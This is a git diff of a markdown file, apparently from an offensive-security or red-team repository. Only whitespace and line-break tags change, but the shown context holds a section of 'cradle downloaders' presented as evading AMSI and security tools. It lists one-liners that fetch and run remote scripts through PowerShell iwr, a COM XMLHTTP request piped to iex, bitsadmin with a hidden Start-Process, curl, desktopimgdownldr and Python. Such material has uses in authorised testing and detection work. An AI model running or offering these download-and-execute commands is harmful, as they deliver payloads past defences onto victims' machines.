@@ -2080,7 +2080,6 @@ Here we can view the all process of encoding/decoding in powershell console
 This section contains onelinner crandle downloaders that for one reason or another does not trigger security applications to flag them as<br />'suspicious behaviour' like some other download/execution technics. ( example: Downloading files using certutil its now blocked by amsi<br /> and every file downloaded using powershell .DownloadFile() API its immediately scanned by amsi ). There are many crandle downloaders available that are not described in this section because amsi flag them (or the files they download) as 'suspicious things to be scanned'.
 
 <br /><br />
-
 Powershell Downloaders<br />
 
       iwr -Uri http://192.168.1.71/hello.ps1 -OutFile $env:tmp\hello.ps1
@@ -2093,7 +2092,7 @@ Powershell Downloaders<br />
       
 ![rf](https://user-images.githubusercontent.com/23490060/94825488-29098b80-03fe-11eb-8ea9-1caca3ab7b4e.png)
 
-<br />
+<br /><br />
 COM Donwloaders<br />
 
       $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
@@ -2108,9 +2107,7 @@ COM Donwloaders<br />
       
 ![powershell Additional Methods for Remote Download](http://i.cubeupload.com/tMG9I8.jpg)
 
-
-
-<br />
+<br /><br />
 BitsAdmin Downloaders<br />
 
       powershell -w 1 Start-BitsTransfer -Source http://191.162.1.73//hello.ps1 -Destination $env:tmp\hello.ps1
@@ -2119,24 +2116,24 @@ BitsAdmin Downloaders<br />
 
       powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground /setcurrentheaders User-Agent:Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko  http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
 
-<br />
+<br /><br />
 Curl Downloaders<br />
 
       cmd /R curl.exe -s http://192.168.1.73/hello.ps1 -o %tmp%\hello.ps1 -u pedro:s3cr3t
 
       cmd /R curl.exe -L -k -s https://raw.githubusercontent.com/r00t-3xp10it/venom/master/venom.sh -o %tmp%\venom.sh -u pedro:s3cr3t
 
-<br />
+<br /><br />
 desktopimgdownldr Downloaders<br />
 
       set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
 
-<br />
+<br /><br />
 Python Downloaders<br />
 
       #!/usr/bin/python;import urllib2;u = urllib2.urlopen('http://192.168.1.73/hello.ps1');localFile = open('local_file', 'w');localFile.write(u.read());localFile.close()
 
-<br />
+<br /><br />
 VbScript Downloaders (VBS)<br />
 
 ```
